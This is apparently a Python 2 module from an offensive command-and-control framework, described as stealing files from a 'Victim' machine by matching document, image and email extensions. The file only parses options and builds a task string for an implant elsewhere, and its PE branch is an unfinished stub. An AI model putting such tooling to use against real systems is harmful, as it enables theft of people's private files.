from support import database

#Standard class name for each module when invoking
class IllusiveFogModule:
    def __init__(self,params=[]):
        self.params= params

        #Module Information
        self.info={
            'Name'       : 'File Fetcher/Graber',
            'Description': 'The Module Aims to Steal/Grab Files based on regex provided for file extension.',
            'Author'     : 'Internal Dev Team',
            'Escalated'  :  False
        }

        #Module Options
        self.options={
            'Operation': self.params[1],
            'Victim': self.params[0]
        }

        #Module Help
        self.modulehelp = """
        FileFetcher
        ============
        Description : The Module Aims to Steal/Grab Files based on regex provided for file extension.
        URLS        : N/A  

        Options :
            FetchFiles - FileFetch <TYPE> <TARGET PATH> <PASSWORD>
                    Example : FileFecth NonPE C:\\Users\\<user>\\Desktop\\Important PDF\\  Password123
                

        """

        #Non-PE Files
        self.TypeNonPE = r"^.*(doc|docx|docm|xls|xlsx|xlsm|pdf|jpg|png|bmp|msg|eml)"

        #PE Files
        self.TypePE = ":0x23"


#Main function which will be called, Must return
    def run(self):

        #saving options
        self.operation=self.options['Operation']
        self.victim = self.options['Victim']
        
        #print info about module
        print ""
        print "Module Info:"
        print "-----------"
        print "Name :"+self.info['Name'] 
        print "Description :"+self.info['Description']
        print "Author :"+self.info['Author']
        print "[info] For more info about module usage, use option 'help'. example: FileFetch help"
        print "\n"
        
        self.initOperation=self.operation.split()

        if self.initOperation[0] == "help":
            print self.modulehelp
            return False 

        elif self.initOperation[0] == "NonPE":
            return self.TypeNonPE +";"+ self.initOperation[2] +";"+ self.initOperation[1]
        
        elif self.initOperation[0] == "PE":
            print "PE file"
            pass

        else:
            print "[ERROR] Invalid Operation."
            return False
